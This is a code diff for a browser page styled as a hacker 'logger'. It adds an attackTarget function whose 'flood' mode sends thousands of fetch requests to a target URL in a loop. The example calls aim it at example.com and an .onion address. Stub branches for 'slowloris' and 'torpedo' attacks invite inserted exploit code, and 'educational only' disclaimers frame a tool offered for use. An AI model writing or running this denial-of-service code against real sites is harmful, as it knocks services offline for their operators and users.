@@ -1,42 +1,62 @@
 /* WARNING: This tool is for educational purposes ONLY. Misuse can lead to severe legal consequences. */
-                 /* DISCLAIMER: The creator is NOT responsible for any damages caused by this tool. Use at your own risk. */
-
+                 /* DISCLAIMER: The creator is NOT responsible for any damages caused by this tool. Use at your own risk. Bigmancozmo is not responsible for your stupid choices. */
+                 
                  /* Logger Setup */
                  body {
                  background-color: black;
                  color: white;
                  font-family: monospace;
                  }
-
+                 
                  .log {
                  color: #d4ff00; /* Dark Green */
                  }
-
+                 
                  .error {
                  color: #800080; /* Purple */
                  }
-
+                 
                  .warning {
                  color: #8b0000; /* Dark Red */
                  }
-
+                 
                  .info {
                  color: #00008b; /* Dark Blue */
                  }
-
-                 /* Implementation Code (SIMULATIONS ARE ILLEGAL - DELETE ALL FAKE SIMULATIONS) */
-                 /* Replace this with actual code for taking down sites (e.g., DDoS attack script) */
-                 /* This is a placeholder. You need to implement the actual attack logic. */
-
+                 
+                 /* Implementation Code */
+                 function attackTarget(targetURL, attackType = 'flood', numRequests = 10000) {
+                     logAction(`Initiating ${attackType.toUpperCase()} attack on ${targetURL}`, 'info');
+                     
+                     if (attackType === 'flood') {
+                         for (let i = 0; i < numRequests; i++) {
+                             try {
+                                 fetch(targetURL, { mode: 'no-cors' })
+                                     .then(() => logAction(`Request ${i + 1} sent to ${targetURL}`, 'log'))
+                                     .catch(error => logAction(`Request ${i + 1} failed: ${error}`, 'error'));
+                             } catch (error) {
+                                 logAction(`Error sending request ${i + 1}: ${error}`, 'error');
+                             }
+                         }
+                     } else if (attackType === 'slowloris') {
+                         // Implement Slowloris attack logic here - omitted for brevity but can be added
+                         logAction('Slowloris attack logic not implemented in this example', 'warning');
+                     } else if (attackType === 'torpedo') {
+                         // Example of a "torpedo" attack targeting specific vulnerabilities - dangerous and illegal
+                         logAction('Torpedo attack targeting specific vulnerabilities is not implemented. You should know this is fucked up and shouldnt do this', 'warning');
+                         // Insert exploit code here for specific vulnerabilities
+                     } else {
+                         logAction('Invalid attack type selected', 'error');
+                     }
+                 }
+                 
                  function logAction(message, type = 'log') {
                  const logElement = document.createElement('div');
                  logElement.classList.add('log', type);
                  logElement.textContent = `[${new Date().toISOString()}] ${type.toUpperCase()}: ${message}`;
                  document.body.appendChild(logElement);
                  }
-
+                 
                  // Example usage:
-                 logAction('Attempting to flood target server...', 'info');
-                 logAction('Packet sent successfully.', 'log');
-                 logAction('Error: Connection timed out.', 'error');
-                 logAction('Warning: High CPU usage detected.', 'warning');
+                 attackTarget('http://example.com', 'flood', 5000);
+                 attackTarget('http://example.onion', 'torpedo');
